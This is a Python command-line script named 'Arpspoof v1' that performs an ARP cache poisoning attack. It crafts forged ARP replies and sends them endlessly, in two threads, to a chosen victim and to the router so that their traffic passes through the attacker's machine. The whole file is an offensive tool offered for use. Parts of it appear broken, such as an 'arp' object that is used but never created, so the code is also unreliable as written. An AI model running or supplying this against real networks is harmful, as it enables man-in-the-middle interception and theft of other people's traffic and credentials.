from __future__ import print_function
import socket
import binascii
import threading
import sys
import time
import argparse

class Arp_Spoof(object):
	"""Does the arp spoof for the set up"""
	def __init__(self, interface):
		global s, redirect_to_mac, arp
		super(Arp_Spoof, self).__init__()
		s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
		try:
			s.bind((interface, socket.htons(0x0800)))
		except socket.error:
			print("\033[1;31mUnable to bind to interface... unknown type\033[00m")
			exit()

	def craft_packet(self, target_ip=None, redirect_to_ip=None, redirect_to_mac=None):
		#thanks to techb for help
		if target_ip and redirect_to_ip and redirect_to_mac != None:
			target_mac='FF:FF:FF:FF:FF:FF'
			arp_header_code = '\x08\x06'
			target_ip = socket.inet_aton(target_ip)
			target_mac = binascii.unhexlify(''.join(target_mac.split(':')))
			redirect_to_ip = socket.inet_aton(redirect_to_ip)
			redirect_to_mac = binascii.unhexlify(''.join(redirect_to_mac.split(':')))

			#Ethernet headers
			eth_head =  target_mac + redirect_to_mac + arp_header_code

			#Arp headers
			header_type = '\x00\x01'
			protocol = '\x08\x00'
			mac_size = '\x06'
			ip_size = '\x04'
			option_code = '\x00\x02'

			arp_head = header_type + protocol + mac_size + ip_size + option_code

			#Spoofed Bit
			spoofed_part = redirect_to_mac + redirect_to_ip + target_mac + target_ip

			#Final Packet
			arp_packet = eth_head + arp_head + spoofed_part

			return arp_packet

	def poison_victim(self, rdi, ti, verbose, ifa):
		with open('/sys/class/net/{}/address'.format(ifa), 'r') as file:
			redirect_to_mac = file.read().strip()
		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
		i = 0
		while True:
			try:
				if __name__ == '__main__':
					i += 1
					sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
					sys.stdout.flush()
				s.send(packet)
				time.sleep(verbose)
			except socket.error as e:
				print("\033[1;31m"+str(e)+"\033[00m")
				exit()

	def poison_router(self, rdi, ti, verbose, ifa):
		with open('/sys/class/net/{}/address'.format(ifa), 'r') as file:
			redirect_to_mac = file.read().strip()
		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
		i = 0
		while True:
			try:
				if __name__ == '__main__':
					i += 1
					sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
					sys.stdout.flush()
				s.send(packet)
				time.sleep(verbose)
			except socket.error as e:
				print("\033[1;31m"+str(e)+"\033[00m")
				exit()

if __name__ == '__main__':
	ap = argparse.ArgumentParser(description="ARP Cache Poisoning Attack")
	ap.add_argument("-t", "--target", help="This is the targets ip address", required=True)
	ap.add_argument("-r", "--router", help="This is the routers ip address", required=True)
	ap.add_argument("-i", "--interface", help="This is the network cards current interface", required=True)
	ap.add_argument("-v", "--verbose", help="This is the amount of time between each packet (seconds)", required=False, default=1)
	args = ap.parse_args()

	#Banner
	print("\033[1;3mArpspoof v1 [{}]\033[00m".format(args.interface))



	#Handle any possable errors
	try:
		int(args.verbose)
	except ValueError:
		print("\033[1;31mTime must be whole number\033[00m")
		exit()
	try:
		socket.inet_aton(args.target)
		socket.inet_aton(args.router)
	except socket.error:
		print("\033[1;31mIncorrect IP address\033[00m")
		exit()

	victim_thread = threading.Thread(target=arp.poison_victim, args=(args.target, args.router, int(args.verbose), args.interface))
	victim_thread.deamon = True
	victim_thread.start()

	target_thread = threading.Thread(target=arp.poison_router, args=(args.router, args.target, int(args.verbose), args.interface))
	target_thread.deamon = True
	target_thread.start()